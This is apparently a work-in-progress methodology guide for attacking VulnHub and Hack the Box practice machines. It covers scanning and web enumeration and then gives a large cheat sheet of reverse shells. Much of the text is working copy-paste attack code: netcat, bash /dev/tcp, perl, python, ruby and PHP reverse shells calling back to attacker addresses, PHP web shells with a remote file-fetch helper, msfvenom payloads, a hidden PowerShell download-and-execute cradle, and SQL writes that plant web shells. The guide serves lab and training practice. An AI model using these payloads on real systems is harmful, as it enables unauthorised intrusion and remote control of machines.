********************************
CTF Series : Vulnerable Machines
********************************

This post (Work in Progress) records what we learned by doing vulnerable machines provided by `VulnHub <https://vulnhub.com>`_, `Hack the Box <https://hackthebox.eu>`_ and others. The steps below could be followed to find vulnerabilities, exploit these vulnerablities and finally become system/ root.

Once you download a virtual machines from `VulnHub <https://vulnhub.com>`_  you can run it by using virtualization software such as VMware or Virtual Box.

We would like to **thank g0tm1lk** for maintaining **Vulnhub** and the **moderators** of **HackTheBox**. Also, **shout-outs** are in order for each and every **authors of Vulnerable Machines and/ or write-ups**. Thank you for providing these awesome challenges to learn from and sharing your knowledge with the IT security community! **Thank You!!**

You generally go through the following stages when solving a vulnerable machine:

* :ref:`finding-the-ip-address`
* :ref:`port-scanning`
* :ref:`rabbit-holes`
* :ref:`from-nothing-to-unprivileged-shell`
* :ref:`unprivileged-shell-to-privileged-shell`

On this blog, we have mentioned, what can be done in each stages. Furthermore, we have also provided :ref:`tips-and-tricks` for solving vulnerable VMs. Additionally :doc:`LFF-IPS-P2-VulnerabilityAnalysis` could be referred for exploitation of any particular services (i.e. it provides information such as "If you have identified service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited"). Lastly there are also appendixes related to :ref:`A1-Local-file-Inclusion` and :ref:`A2-File-Upload`.

.. _finding-the-ip-address:

Finding the IP address
======================

Before, exploiting any machine, we need to figure out it IP address.

Netdiscover
-----------

An active/ passive arp reconnaissance tool

::

  netdiscover [options] 
  -i interface : The network interface to sniff and inject packets on. 
  -r range : Scan a given range instead performing an auto scan.

  Example: 
  netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24 
	
Interface names of common Virtualization Software:

* Virtualbox : vboxnet 
* Vmware     : vmnet 

Nmap
----

Network exploration tool and security/ port scanner 

::

  nmap [Scan Type] [Options] {target specification} 
  -sP/-sn Ping Scan -disable port scan 

Example:

::

 nmap -sP/-sn 192.168.1.0/24

.. _port-scanning:

Port Scanning
=============
	
Port scanning provides a large amount of information on open services and possible exploits that target these services. 

Common port scanning software include: Unicornscan, nmap, netcat (when nmap is not available).

Unicornscan
-----------

A port scanner that utilizes its own userland TCP/IP stack, which allows it to run asynchronous scans. It can scan 65,535 ports in a relatively shorter time frame (faster than nmap). 

::  

   unicornscan [options] X.X.X.X/YY:S-E 
     -i, --interface : interface name, like eth0 or fxp1, not normally required 
     -m, --mode : scan mode, tcp (syn) scan is default, U for udp T for tcp \`sf' for tcp connect scan and A for arp for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn\|FIN\|NO Push\|URG)
     Address ranges are in cidr notation like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask /32 is implied. 
     Port ranges are like 1-4096 with 53 only scanning one port, **a** for all 65k and p for 1-1024

    example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for the host named gateway.

Nmap
-----

Network exploration tool and security/ port scanner 

::

  nmap [Scan Type] [Options] {target specification} 

  HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan 
  -sn/-sP: Ping Scan - disable port scan 
  -Pn: Treat all hosts as online -- skip host discovery

  SCAN TECHNIQUES: 
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans 
  -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans

  PORT SPECIFICATION: 
  -p : Only scan specified ports 
  Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9

  SERVICE/VERSION DETECTION: 
  -sV: Probe open ports to determine service/version info

  OUTPUT: 
  -oN/-oX/-oS/-oG : Output scan in normal, XML,Output in the three major formats at once 
  -v: Increase verbosity level (use -vv or more for greater effect)

  MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute


As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. Superkojiman has written a script for this available at `GitHub <https://github.com/superkojiman/onetwopunch>`_.

netcat 
------
Netcat might not be the best tool to use for port scanning, but it can be used quickly. Netcat scans TCP ports by default, but we can perform UDP scans as well.

TCP Scan
^^^^^^^^

For a TCP scan, the format is:

::

  nc -vvn -z xxx.xxx.xxx.xxx startport-endport
     -z flag is Zero-I/O mode (used for scanning)
     -vv will provide verbose information about the results
     -n flag allows to skip the DNS lookup

UDP Scan
^^^^^^^^

For a UDP Port Scan, we need to add -u flag which makes the format:

::

  nc -vvn -u -z xxx.xxx.xxx.xxx startport-endport


If we have windows machine without nmap, we can use `PSnmap <https://www.powershellgallery.com/packages/PSnmap/>`_


Amap - Application mapper
-------------------------

When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine which application is running.

By using **amap**, we can identify which services are running on a given port. For example is there a SSL server running on port 3445? or some oracle listener on port 23?. Note that the application can also handle services that requires SSL. Therefore it will perform an SSL connect following by trying to identify the SSL-enabled protocol!  One of the vulnhub VM's for example was running http and https on the same port.

::

  amap -A 192.168.1.2 12380 
  amap v5.4 (www.thc.org/thc-amap) started at 2016-08-10 05:48:09 - APPLICATION MAPPING mode
  Protocol on 192.168.1.2:12380/tcp matches http 
  Protocol on 192.168.1.2:12380/tcp matches http-apache-2 
  Protocol on 192.168.1.2:12380/tcp matches ntp 
  Protocol on 192.168.1.2:12380/tcp matches ssl
  Unidentified ports: none.
  amap v5.4 finished at 2016-08-10 05:48:16

.. _rabbit-holes:

Rabbit Holes?
=============

There will be instances when we will not able to find anything entry point such as any open port. The section below may provide some clues how to get unstuck.

.. _listen-to-the-interface:

Listen to the interface
------------------------

Many VMs send data on random ports therefore we recommend to listen to the local interface (vboxnet0 / vmnet) on which the VM is running. This can be done by using wireshark or tcpdump. For example, one of the vulnhub VMs, performs an arp scan and sends a SYN packet on port 4444, if something is listening on that port, it sends some data.

:: 

  tcpdump -i eth0

  18:02:04.096292 IP 192.168.56.101.36327 > 192.168.56.1.4444: Flags [S], seq 861815232, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 4127458640 ecr 0], length 0
  18:02:04.096330 IP 192.168.56.1.4444 > 192.168.56.101.36327: Flags [R.], seq 0, ack 861815233, win 0, length 0
  18:02:04.098584 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
  18:02:04.100773 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28
  18:02:04.096292 IP 192.168.56.101.36327 > 192.168.56.1.4444: Flags [S],

While listening on port 4444, we might receive something like a base64 encoded string or some message.

::

  nc -lvp 4444
  listening on [any] 4444 …
  192.168.56.101: inverse host lookup failed: Unknown host
  connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
  0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxh

DNS Server
----------

If the targeted machine is running a DNS Server and we have a possible domain name, we may try to figure out A, MX, AAAA records or try zone-transfer to figure out other possible domain names.

::

 host <domain> <optional_name_server>
 host -t ns <domain>                -- Name Servers
 host -t a <domain>                 -- Address
 host -t aaaa <domain>              -- AAAA record points a domain or subdomain to an IPv6 address
 host -t mx <domain>                -- Mail Servers
 host -t soa <domain>               -- Start of Authority
 host <IP>                          -- Reverse Lookup
 host -l <Domain Name> <DNS Server> -- Domain Zone Transfer
 
 **todo add output example**

SSL Certificate
---------------

If the targetted machine is running an https server and we are getting a apache default webpage on hitting the https://IPAddress. vhosts are probably in use. Check the alt-dns-name on the ssl-certificate, create an entry in hosts file ( /etc/hosts ) and check what is being hosted on these domain names by surfing to https://alt-dns-name.

nmap service scan result for port 443 (sample)

::

 | ssl-cert: Subject: commonName=examplecorp.com/organizationName=ExampleCorp Ltd./stateOrProvinceName=Attica/countryName=IN/localityName=Mumbai/organizationalUnitName=IT/emailAddress=admin@examplecorp.com
 | Subject Alternative Name: DNS:www.examplecorp.com, DNS:admin-portal.examplecorp.com


.. _from-nothing-to-unprivileged-shell:

From Nothing to a Unprivileged Shell
====================================

At this point, we would have an idea about the different services and service version running on the system. Besides the output given by the nmap. It is also recommended to check what software is being used on the webservers (eg certain cms's)

searchsploit
------------

Exploit Database Archive Search

First, we check if the operating system and/ or the exposed services are vulnerable to exploits which are already available on the internet. For example, a vulnerable service webmin is present in one of the VM which could be exploited to extract information from the system.

::

  root@kali:~# nmap -sV -A 172.16.73.128
  **********Trimmed**************
  10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
  |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
  |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
  | ndmp-version: 
  |_  ERROR: Failed to get host information from server
  **********Trimmed**************

If we search for webmin with searchsploit, we will find different exploits available for it and we just have to use the correct one based on utility and the version matching.

::

  root@kali:~# searchsploit webmin
  **********Trimmed**************
  Description                                                                            Path
  ----------------------------------------------------------------------------------------------------------------
  Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit                   | /multiple/remote/1997.php
  Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit (perl)            | /multiple/remote/2017.pl
  Webmin 1.x HTML Email Command Execution Vulnerability                                | /cgi/webapps/24574.txt
  **********Trimmed**************

Once we have figured out which exploit to check we can read about it by using the file-number. For example: 1997, 2017, 24574 in the above case.

::

 searchsploit -x 24674


Searchsploit even provide an option to read the nmap XML file and suggest vulnerabilities ( Requires nmap -sV -x xmlfile ).

::
  
  searchsploit
       --nmap     [file.xml]  Checks all results in Nmap's XML output with service version (e.g.: nmap -sV -oX file.xml).
                              Use "-v" (verbose) to try even more combinations


.. Tip :: If we don't manage to find an exploit for a specific version, it is recommended to check the notes of the exploits which are highlighted as they may be valid for lower versions too. For example Let's say we are searching for exploits in Example_Software version 2.1.3. However, version 2.2.2 contains multiple vulnerablities. Reading the description for 2.2.2 we find out it's valid for lower versions too.

SecLists.Org Security Mailing List Archive
------------------------------------------

There will be some days, when you won't find vulnerability with searchsploit. In this case, we should also check the `seclists.org security mailing list google search <http://seclists.org/>`_, if someone has reported any bug for that particular software that we can exploit. 

Google-Vulns
------------

It is suggested that whenever you are googling something,  you add words such as vulnerability, exploit, ctf, github, python, tool etc. to your searchterm. For example. Let's say, you are stuck in a docker or on a specific cms search for docker ctf or <cms_name> ctf/ github etc.

Webservices
-----------

If a webserver is running on a machine, we can start with running 
 
whatweb
^^^^^^^

Utilize whatweb to find what software stack a server is running.

::

 whatweb www.example.com
 http://www.example.com [200 OK] Cookies[ASP.NET_SessionId,CMSPreferredCulture,citrix_ns_id], Country[INDIA][IN], Email[infosecurity@zmail.example.com], Google-Analytics[Universal][UA-6386XXXXX-2], HTML5, HTTPServer[Example Webserver], HttpOnly[ASP.NET_SessionId,CMSPreferredCulture,citrix_ns_id], IP[XXX.XX.XX.208], JQuery[1.11.0], Kentico-CMS, Modernizr, Script[text/javascript], Title[Welcome to Example Website ][Title element contains newline(s)!], UncommonHeaders[cteonnt-length,x-cache-control-orig,x-expires-orig], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=9,IE=edge]


nikto
^^^^^
nikto - Scans a web server for known vulnerabilities. 

It will examine a web server to find potential problems and security vulnerabilities, including:

* Server and software misconfigurations
* Default files and programs
* Insecure files and programs
* Outdated servers and programs

dirb, wfuzz, dirbuster
^^^^^^^^^^^^^^^^^^^^^^

Furthermore, we can run the following programs to find any hidden directories.

* `DIRB <https://tools.kali.org/web-applications/dirb>`_ is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analyzing the response.
* `wfuzz <https://tools.kali.org/web-applications/wfuzz>`_ - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let's say, when we dirb we get 50 directories. Each directory containing an image. Most of the time, we then need to figure out which image is different. In this case, we would figure out what's the size of the normal image and hide that particular response with wfuzz.
* `Dirbuster <https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project>`_ : DirBuster is a multi threaded java application designed to brute force directories and files names on web/ application servers. 

.. Tip :: Probably, we will be using common.txt (/usr/share/wordlists/dirb/) . If it's doesn't find anything, it's better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is a list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn't work out, try searching with extensions such as .txt, .js, .html, .php. (.txt by default and rest application based)

.. Tip :: If using the dirb/ wfuzz wordlist doesn't result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories.

BurpSuite Spider
^^^^^^^^^^^^^^^^

There will be some cases when dirb/ dirbuster doesn't find anything. This happened with us on a Node.js web application. Burpsuite's spider helped in finding extra-pages which contained the credentials.


Parameter Fuzz?
^^^^^^^^^^^^^^^

Sometime, we might have a scenario where we have a website which might be protected by WAF.

::

 http://IP/example

Now, this "/example" might be a php or might be accepting a GET Parameter. In that case, we probably need to fuzz it. The hardest thing is that we can find the GET parameters by fuzzing "/example" only if you get some errors from the application, so, the goal is to fuzz using a special char as the parameter's value, something like: "/example?FUZZ=' "

::

 wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "User-Agent: SomethingNotObivousforWAF" "http://IP/example?FUZZ='"

The other things which may try is putting a valid command such as 'ls, test' so it becomes FUZZ=ls or FUZZ=test

**TODO: gobuster ??**

PUT Method
^^^^^^^^^^

Sometimes, it is also a good option to check for the various HTTP verbs that are available such as GET, PUT, DELETE, etc.
This can be done by making an OPTIONS request.

Curl can be used to check the available options (supported http verbs):

::

  curl -X OPTIONS -v http://192.168.126.129/test/
  Trying 192.168.126.129…
  Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
  > OPTIONS /test/ HTTP/1.1
  > Host: 192.168.126.129
  > User-Agent: curl/7.47.0
  > Accept: /
  >
  < HTTP/1.1 200 OK
  < DAV: 1,2
  < MS-Author-Via: DAV
  < Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
  < Allow: OPTIONS, GET, HEAD, POST
  < Content-Length: 0
  < Date: Fri, 29 Apr 2016 09:41:19 GMT
  < Server: lighttpd/1.4.28
  <
  * Connection #0 to host 192.168.126.129 left intact

The PUT method allows you to upload a file. Which can help us to get a shell on the machine. There are multiple methods available for uploading a file with the PUT method mentioned on `Detecting and exploiting the HTTP Put Method <http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html>`_ 

A few are:

* Nmap:

 ::

   nmap -p 80 --script http-put --script-args http-put.url='/uploads/rootme.php',http-put.file='/tmp/rootme.php'

* curl:

 ::

   curl --upload-file test.txt -v --url http://192.168.126.129/test/test.txt

 or

 :: 

   curl -X PUT -d '

Wordpress
^^^^^^^^^

When faced with a website that makes use of the wordpress CMS one can run wpscan. Make sure you run \-\-enumerate u for enumerating usernames because by default wpscan doesn't run it. Also, scan for plugins

::

  wpsscan
    --url       | -u <target url>       The WordPress URL/domain to scan.
    --force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
    --enumerate | -e [option(s)]        Enumeration.
    option :
    	u        usernames from id 1 to 10
    	u[10-20] usernames from id 10 to 20 (you must write [] chars)
    	p        plugins
    	vp       only vulnerable plugins
    	ap       all plugins (can take a long time)
    	tt       timthumbs
    	t        themes
    	vt       only vulnerable themes
    	at       all themes (can take a long time)
    	Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins
    	If no option is supplied, the default is "vt,tt,u,vp"

We can also use wpscan to bruteforce password for a username 

::

  wpscan --url http://192.168.1.2 --wordlist wordlist.txt --username example_username

Tips

* If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance > Editor > Possibly edit 404 Template.
* The configuration of worpdress is normally speaking stored in wp-config.php. If you are able to download it, you might be luckiy and be able to loot plaintext username and passwords to database or wp-admin page. 
* If the website is vulnerable for SQL-Injection. We should be able to extract the wordpress users and their password hashes. However, if the password hash is not crackable. Probably, check the wp-posts table as it might contain some hidden posts.
* Got wordpress credentials, may be utilize `WPTerm <https://wordpress.org/plugins/wpterm/>`_ xterm-like plugin. It can be used to run non-interactive shell commands from the WordPress admin dashboard.
* If there's a custom plugin created, probably, it would be in the location

 ::

   http://IP/wp-content/plugins/custompluginname

**todo: elborate more on wp scanning and vulnerabilities?**

Names? Possible Usernames & Passwords?
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   
Sometimes, when visiting webpages, you will find possible names of the employees working in the company. It is common practice to have a username based on your first/ last name. Superkojiman has written a script `namemash.py <https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py>`_ which could be used to create possible usernames. However, then we are left with a large amount of potential usernames with no passwords.

If the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.

* Using metasploit smtp\_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp\_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.
* Using VRFY command:
* Using RCPT TO command:

Brute forcing: hydra
^^^^^^^^^^^^^^^^^^^^

Hydra can be used to brute force login web pages

::

  -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE  (userlist)
  -p PASS  or -P FILE try password PASS, or load several passwords from FILE  (passwordlist)
  -U        service module usage details
  -e nsr additional checks, "n" for null password, "s" try login as pass, "r" try the reverse login as pass

hydra http-post-form:

:: 

   hydra -U http-post-form

**Help for module http-post-form**

Module http-post-form requires the page and the parameters for the web form.

The parameters take three ":" separated values, plus optional values.

::

  Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]

* First is the page on the server to GET or POST to (URL).
* Second is the POST/GET variables (taken from either the browser, proxy, etc. with usernames and passwords being replaced with the "^USER^" and "^PASS^" placeholders (FORM PARAMETERS)
* Third is the string that it checks for an *invalid* login (by default) Invalid condition login check can be preceded by "F=", successful condition login check must be preceded by "S=". This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!
* The following parameters are optional:
  C=/page/uri     to define a different page to gather initial cookies from
  (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request ^USER^ and ^PASS^ can also be put into these headers!

 * Note: 

  * 'h' will add the user-defined header at the end regardless it's already being sent by Hydra or not.
  * 'H' will replace the value of that header if it exists, by the one supplied by the user, or add the header at the end

 * Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\). All colons that aren't option separators should be escaped (see the examples above and below). You can specify a header without escaping the colons, but that way you will not be able to put colons in the header value itself, as they will be interpreted by hydra as option separators.

Examples:

:: 

 "/login.php:user=^USER^&pass=^PASS^:incorrect"
 "/login.php:user=^USER^&pass=^PASS^&colon=colon\:escape:S=authlog=.*success"
 "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
 "/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
 "/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"

**TODO ncrack?**

Reverse Shells
--------------

Possibly, we would have figured out some vulnerability or misconfiguration in the running services which allows us to have a reverse shell using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. Mostly taken from `PentestMonkey Reverse shell cheat sheet <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>`_  and `Reverse Shell Cheat sheet from HighOn.Coffee <https://highon.coffee/blog/reverse-shell-cheat-sheet/>`_ and more.

netcat (nc)
^^^^^^^^^^^

* with the -e option

 ::

   nc -e /bin/sh 10.0.0.1 1234

* without -e option

 ::

   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

PHP
^^^

* **PHP Shell**

 We can create a new file say (shell.php) on the server containing

 :: 

   <?php system($_GET["cmd"]); ?>

 or

 :: 

   <?php echo shell_exec($_GET["cmd"]); ?>

 or

 ::

   <? passthru($_GET["cmd"]); ?>

 which can then be accessed by

 :: 

  http://IP/shell.php?cmd=id

 If there's a webpage which accepts phpcode to be executed, we can use curl to urlencode the payload and run it.

 ::

  curl -G -s http://10.X.X.X/somepage.php?data= --data-urlencode "html=<?php passthru('ls -lah'); ?>" -b "somecookie=somevalue" | sed '/<html>/,/<\/html>/d'
  
  -G When used, this option will make all data specified with -d, --data, --data-binary or --data-urlencode to be used in an HTTP GET request instead of the POST request that otherwise would be used. The data will be appended to the URL with a  '?' separator.
  -data-urlencode <data> (HTTP) This posts data, similar to the other -d, --data options with the exception that this performs URL-encoding. 
  -b, --cookie <data> (HTTP) Pass the data to the HTTP server in the Cookie header. It is supposedly the data previously received from the server in a "Set-Cookie:" line.  The data should be in the format "NAME1=VALUE1; NAME2=VALUE2".

 If you also want to provide upload functionality (Imagine, if we need to upload nc64.exe on Windows or other-binaries on linux), we can put the below code in the php file

 ::

  <?php 
   if (isset($_REQUEST['fupload'])) {
    file_put_contents($_REQUEST['fupload'], file_get_contents("http://yourIP/" . $_REQUEST['fupload']));
   };
   if (isset($_REQUEST['cmd'])) {
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
   }
  ?>

  
* **PHP Meterpreter**

 We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.

**todo explain how to set up a multi handler**

 ::

  msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php

* **PHP Reverse Shell**

 The code below assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6

 :: 

  php -r '$sock=fsockopen("192.168.56.101",1337);exec("/bin/sh -i <&3 >&3 2>&3");'

 The above can be connected to by listening on port 1337 by using nc

Weevely
^^^^^^^

Weevely also generates a webshell

:: 

  weevely generate password /tmp/payload.php

which can be called by

:: 

  weevely http://192.168.1.2/location_of_payload password

However, it wasn't as useful as php meterpreter or a reverse shell.


Ruby
^^^^

:: 

  ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Perl
^^^^

.. code-block :: bash 

  perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Python
^^^^^^

TCP

::  

  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

UDP

::

 import os,pty,socket;s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(("10.10.14.17", 4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE",'/dev/null');pty.spawn("/bin/sh");s.close()

Java
^^^^

.. code-block :: bash 

  r = Runtime.getRuntime()
  p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
  p.waitFor()

JSP
^^^

.. code-block :: bash 

   msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f war > runme.war

Bash /dev/tcp
^^^^^^^^^^^^^

If a server is listening on a port:

::

  nc -lvp port

then we can use the below to connect

Method 1: 

::
   
  /bin/bash -i >&/dev/tcp/IP/Port 0>&1

Method 2:

::

 exec 5<>/dev/tcp/IP/80
 cat <&5 | while read line; do $line 2>&5 >&5; done  

 # or:

 while read line 0<&5; do $line 2>&5 >&5; done

Method 3:

::

 0<&196;exec 196<>/dev/tcp/IP/Port; sh <&196 >&196 2>&196

 -- We may execute the above using bash -c "Aboveline "

`Information about Bash Built-in /dev/tcp File (TCP/IP) <http://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip>`_

The following script fetches the front page from Google:

::

 exec 3<>/dev/tcp/www.google.com/80
 echo -e "GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n" >&3
 cat <&3

* The first line causes file descriptor 3 to be opened for reading and writing on the specified TCP/IP socket. This is a special form of the exec statement. From the bash man page:

 ::

  exec [-cl] [-a name] [command [arguments]]

 If command is not specified, any redirections take effect in the current shell, and the return status is 0. So using exec without a command is a way to open files in the current shell.

* Second line:  After the socket is open we send our HTTP request out the socket with the echo ... >&3 command. The request consists of:

 ::

  GET / HTTP/1.1
  host: http://www.google.com
  Connection: close

 Each line is followed by a carriage-return and newline, and all the headers are followed by a blank line to signal the end of the request (this is all standard HTTP stuff).

* Third line: Next we read the response out of the socket using cat <&3, which reads the response and prints it out.

Telnet Reverse Shell
^^^^^^^^^^^^^^^^^^^^

::

 rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p

 telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443

XTerm
^^^^^

One of the simplest forms of reverse shell is an xterm session. The following command should be run on the victim server. It will try to connect back to you (10.0.0.1) on TCP port 6001.

.. code-block :: bash 

  xterm -display 10.0.0.1:1


To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):

::
 
   Xnest :1 -listen tcp

You’ll need to authorize the target to connect to you (command also run on your host):

::

  xhost +targetip

Lynx
^^^^

Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs. 
This is a big security hole for sites that use lynx "guest accounts" and other public services. More details `LynxShell <http://insecure.org/sploits/lynx.download.html>`_ 

When you start up a lynx client session, you can hit "g" (for Goto) and then enter the following URL:

:: 

  URL to open: LYNXDOWNLOAD://Method=-1/File=/dev/null;/bin/sh;/SugFile=/dev/null

MYSQL
^^^^^

* If we have MYSQL Shell via sqlmap or phpmyadmin, we can use mysql outfile/ dumpfile function to upload a shell.

 :: 

   echo -n "<?php phpinfo(); ?>" | xxd -ps 3c3f70687020706870696e666f28293b203f3e
   select 0x3c3f70687020706870696e666f28293b203f3e into outfile "/var/www/html/blogblog/wp-content/uploads/phpinfo.php"

 or 

 ::
 
  SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php';

* If you have sql-shell from sqlmap/ phpmyadmin, we can read files by using the load_file function.

 :: 
	
   select load_file('/etc/passwd');

Reverse Shell from Windows
^^^^^^^^^^^^^^^^^^^^^^^^^^

If there's a way, we can execute code from windows, we may try

* Powershell Empire/ Metasploit Web-Delivery Method
* Invoke-Shellcode (from powersploit)

 ::

  Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://YourIPAddress:8000/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost YourIPAddress -Lport 4444 -Force"

* Upload ncat and execute 

MSF Meterpreter ELF
^^^^^^^^^^^^^^^^^^^

::

 msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o met LHOST=10.10.XX.110 LPORT=4446

Metasploit MSFVenom
^^^^^^^^^^^^^^^^^^^

Ever wondered from where the above shells came from? Maybe try msfvenom and grep for cmd/unix

::

 msfvenom -l payloads | grep "cmd/unix"
 **snip**
    cmd/unix/bind_awk                                   Listen for a connection and spawn a command shell via GNU AWK
    cmd/unix/bind_inetd                                 Listen for a connection and spawn a command shell (persistent)
    cmd/unix/bind_lua                                   Listen for a connection and spawn a command shell via Lua
    cmd/unix/bind_netcat                                Listen for a connection and spawn a command shell via netcat
    cmd/unix/bind_perl                                  Listen for a connection and spawn a command shell via perl
    cmd/unix/interact                                   Interacts with a shell on an established socket connection
    cmd/unix/reverse                                    Creates an interactive shell through two inbound connections
    cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK
    cmd/unix/reverse_python                             Connect back and create a command shell via Python
    cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.
    cmd/unix/reverse_r                                  Connect back and create a command shell via R
    cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby
 **snip**

Now, try to check the payload

::

 msfvenom -p cmd/unix/bind_netcat
 Payload size: 105 bytes
 mkfifo /tmp/cdniov; (nc -l -p 4444 ||nc -l 4444)0</tmp/cdniov | /bin/sh >/tmp/cdniov 2>&1; rm /tmp/cdniov


.. _spawning-a-tty-shell:

Spawning a TTY Shell
--------------------

Once we have reverse shell, we need a full TTY session by using either Python, sh, perl, ruby, lua, IRB. `Spawning a TTY Shell <https://netsec.ws/?p=337>`_ and `Post-Exploitation Without A TTY <http://pentestmonkey.net/blog/post-exploitation-without-a-tty>`_ has provided multiple ways to get a tty shell

Python
^^^^^^

.. code-block :: bash 

  python -c 'import pty; pty.spawn("/bin/sh")'

or

.. code-block :: bash

  python -c 'import pty; pty.spawn("/bin/bash")'

.. code-block :: bash

  python -c 'import os; os.system("/bin/bash")'

sh
^^

.. code-block :: bash

  /bin/sh -i

Perl
^^^^

.. code-block :: bash 

  perl -e 'exec "/bin/sh";'

.. code-block :: bash

  perl: exec "/bin/sh";

Ruby
^^^^

.. code-block :: bash

   ruby: exec "/bin/sh"

Lua
^^^

.. code-block :: bash

